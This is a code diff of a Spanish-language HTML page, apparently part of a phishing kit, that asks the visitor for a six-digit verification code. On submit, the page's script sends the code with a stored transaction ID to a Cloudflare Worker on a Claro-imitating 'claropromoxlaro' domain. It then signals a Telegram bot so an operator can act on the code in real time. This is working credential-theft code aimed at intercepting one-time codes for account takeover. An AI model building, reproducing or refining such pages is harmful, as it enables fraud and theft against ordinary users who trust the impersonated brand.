@@ -1,54 +1,70 @@
-<script>
-    const inputs = document.querySelectorAll('.password-input');
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Ingresar Código</title>
+  <style>
+    body { display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+    .box { text-align: center; }
+    .inputs { display: flex; gap: 10px; margin-bottom: 20px; justify-content: center; }
+    .inputs input { width: 40px; height: 40px; text-align: center; font-size: 20px; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Ingrese el código</h2>
+    <div class="inputs">
+      <input type="password" maxlength="1">
+      <input type="password" maxlength="1">
+      <input type="password" maxlength="1">
+      <input type="password" maxlength="1">
+      <input type="password" maxlength="1">
+      <input type="password" maxlength="1">
+    </div>
+    <button id="enviar">Enviar</button>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll('.inputs input');
 
     inputs.forEach((input, index) => {
-        input.addEventListener('input', (e) => {
-            if (e.target.value !== '') {
-                if (index < inputs.length - 1) {
-                    inputs[index + 1].focus();
-                }
-            }
-        });
-
-        input.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && index > 0) {
-                inputs[index - 1].focus();
-            }
-        });
-    });
-
-    document.getElementById('continuar').addEventListener('click', async () => {
-        // Concatenar valores
-        const inputValues = Array.from(document.querySelectorAll('.password-input'))
-                                .map(input => input.value)
-                                .join('');
-
-        const transactionId = localStorage.getItem("transactionId");
-
-        if (!transactionId) {
-            alert("❌ No se encontró transactionId");
-            return;
+      input.addEventListener('input', (e) => {
+        if (e.target.value && index < inputs.length - 1) {
+          inputs[index + 1].focus();
         }
+      });
 
-        // 📤 Enviar el código al Worker
-        await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/codigo", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ id: transactionId, codigo: inputValues })
-        });
-
-        // 🔄 Hacer reset para que vuelvan los botones en Telegram
-        await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/reset", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ id: transactionId })
-        });
-
-        alert("✅ Código enviado y botones reactivados");
-        window.location.href = "verificando.html"; // o la que quieras
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
     });
 
-    document.getElementById('cancelar').addEventListener('click', () => {
-        window.location.href = 'index.html';
+    document.getElementById('enviar').addEventListener('click', async () => {
+      const codigo = Array.from(inputs).map(i => i.value).join('');
+      const id = localStorage.getItem("transactionId");
+
+      if (!id) return alert("No se encontró transactionId");
+
+      // Enviar código
+      await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/codigo", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id, codigo })
+      });
+
+      // Reset → reactivar botones
+      await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/reset", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id })
+      });
+
+      alert("✅ Código enviado. Botones reactivados en Telegram.");
+      window.location.href = "verificando.html";
     });
-</script>
+  </script>
+</body>
+</html>
